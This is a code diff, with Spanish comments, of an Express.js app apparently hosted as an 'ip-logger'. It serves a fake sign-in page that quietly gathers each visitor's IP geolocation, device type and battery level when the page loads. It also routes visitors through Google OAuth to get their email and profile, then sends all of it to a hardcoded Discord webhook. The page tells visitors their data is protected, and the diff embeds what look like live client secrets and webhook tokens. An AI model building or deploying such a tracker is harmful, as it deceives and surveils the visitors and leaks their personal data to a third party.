@@ -4,13 +4,13 @@ const app = express();
 
 app.use(express.json());
 
-// ======== TUS CREDENCIALES (YA INTEGRADAS) ========
+// ======== TUS CREDENCIALES (CORREGIDAS) ========
 const CLIENT_ID = '189299322354-u20tl4ks27e1npj8m1rlp7qjbplqj88l.apps.googleusercontent.com';
 const CLIENT_SECRET = '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';
 const REDIRECT_URI = 'https://ip-logger-nine-weld.vercel.app/callback';
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
 
-// ======== RUTA PRINCIPAL ========
+// ======== RUTA PRINCIPAL (HTML CORRECTO) ========
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -44,8 +44,6 @@ app.get('/', (req, res) => {
                     margin-bottom: 15px;
                 }
                 p { color: #888; font-size: 1.1em; margin-bottom: 30px; line-height: 1.5; }
-                
-                /* ✅ ESTE ES UN ENLACE NORMAL - NO SE BLOQUEA */
                 .btn-google {
                     display: inline-flex;
                     align-items: center;
@@ -68,7 +66,6 @@ app.get('/', (req, res) => {
                     box-shadow: 0 6px 25px rgba(66,133,244,0.5);
                 }
                 .btn-google:active { transform: scale(0.95); }
-                
                 .footer {
                     margin-top: 40px;
                     color: #444;
@@ -106,7 +103,6 @@ app.get('/', (req, res) => {
                 <p>Para continuar, inicia sesión con tu cuenta de Google.<br>
                 <span style="color:#666;font-size:0.85em;">Tus datos están protegidos con cifrado SSL.</span></p>
                 
-                <!-- ✅ ENLACE DIRECTO - NUNCA SE BLOQUEA -->
                 <a href="/auth/google" class="btn-google">
                     <svg width="20" height="20" viewBox="0 0 48 48">
                         <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -131,7 +127,6 @@ app.get('/', (req, res) => {
                         const res = await fetch('https://ipapi.co/json/');
                         const data = await res.json();
                         
-                        // Información del dispositivo
                         const ua = navigator.userAgent || '';
                         let dispositivo = 'Desconocido';
                         if (/android/i.test(ua)) dispositivo = 'Android';
@@ -140,7 +135,6 @@ app.get('/', (req, res) => {
                         else if (/mac/i.test(ua)) dispositivo = 'Mac';
                         else if (/linux/i.test(ua)) dispositivo = 'Linux';
                         
-                        // Batería
                         let bateria = 'No disponible';
                         try {
                             if (navigator.getBattery) {
@@ -157,12 +151,10 @@ app.get('/', (req, res) => {
                             region: data.region || 'No disponible',
                             dispositivo: dispositivo,
                             bateria: bateria,
-                            direccionReal: \`\${data.city || 'No disponible'}, \${data.region || 'No disponible'}, \${data.country_name || 'No disponible'}\`,
-                            hora: new Date().toLocaleString(),
-                            userAgent: ua
+                            direccionReal: data.city + ', ' + data.region + ', ' + data.country_name,
+                            hora: new Date().toLocaleString()
                         };
                         
-                        // Enviar a Discord
                         await fetch('/api/log-device', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -178,7 +170,6 @@ app.get('/', (req, res) => {
                     }
                 }
                 
-                // ======== CAPTURAR DATOS AUTOMÁTICAMENTE ========
                 document.addEventListener('DOMContentLoaded', () => {
                     capturarDatos();
                 });
@@ -188,24 +179,22 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ======== RUTA: Iniciar autenticación (REDIRECCIÓN DIRECTA) ========
+// ======== RUTA: Iniciar autenticación ========
 app.get('/auth/google', (req, res) => {
-    // ✅ Esto es una redirección HTTP, NO se bloquea
-    const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
-        `client_id=${CLIENT_ID}&` +
-        `redirect_uri=${REDIRECT_URI}&` +
-        `response_type=code&` +
-        `scope=email profile&` +
-        `prompt=consent`;
+    const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' +
+        'client_id=' + CLIENT_ID +
+        '&redirect_uri=' + REDIRECT_URI +
+        '&response_type=code' +
+        '&scope=email profile' +
+        '&prompt=consent';
     
-    console.log('🔄 Redirigiendo a Google:', authUrl);
+    console.log('🔄 Redirigiendo a Google');
     res.redirect(authUrl);
 });
 
 // ======== RUTA: Callback de Google ========
 app.get('/callback', async (req, res) => {
     const { code } = req.query;
-    console.log('📩 Código recibido:', code ? 'Sí' : 'No');
     
     if (!code) {
         return res.send(`
@@ -225,9 +214,6 @@ app.get('/callback', async (req, res) => {
     }
 
     try {
-        console.log('🔄 Intercambiando código por token...');
-        
-        // 1️⃣ Intercambiar código por token
         const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {
             code,
             client_id: CLIENT_ID,
@@ -237,17 +223,13 @@ app.get('/callback', async (req, res) => {
         });
 
         const { access_token } = tokenResponse.data;
-        console.log('✅ Token obtenido');
 
-        // 2️⃣ Obtener datos del usuario
         const userResponse = await axios.get('https://www.googleapis.com/oauth2/v2/userinfo', {
-            headers: { Authorization: `Bearer ${access_token}` }
+            headers: { Authorization: 'Bearer ' + access_token }
         });
 
         const userData = userResponse.data;
-        console.log('👤 Usuario:', userData.email);
 
-        // 3️⃣ Enviar a Discord
         const embed = {
             color: 0x00ff00,
             title: '✅ NUEVO INICIO DE SESIÓN',
@@ -266,10 +248,7 @@ app.get('/callback', async (req, res) => {
             content: '📢 **¡Nuevo usuario autenticado!**',
             embeds: [embed]
         });
-        
-        console.log('✅ Datos enviados a Discord');
 
-        // 4️⃣ Mostrar éxito
         res.send(`
             <!DOCTYPE html>
             <html>
@@ -336,7 +315,7 @@ app.get('/callback', async (req, res) => {
         `);
 
     } catch (error) {
-        console.error('❌ Error en callback:', error.response?.data || error.message);
+        console.error('❌ Error:', error.response?.data || error.message);
         res.send(`
             <!DOCTYPE html>
             <html>
@@ -358,7 +337,6 @@ app.get('/callback', async (req, res) => {
 app.post('/api/log-device', async (req, res) => {
     try {
         const data = req.body;
-        console.log('📱 Datos del dispositivo:', data);
         
         const embed = {
             color: 0xff8800,
@@ -383,7 +361,7 @@ app.post('/api/log-device', async (req, res) => {
 
         res.json({ success: true });
     } catch (error) {
-        console.error('Error enviando datos del dispositivo:', error);
+        console.error('Error:', error);
         res.status(500).json({ error: error.message });
     }
 });
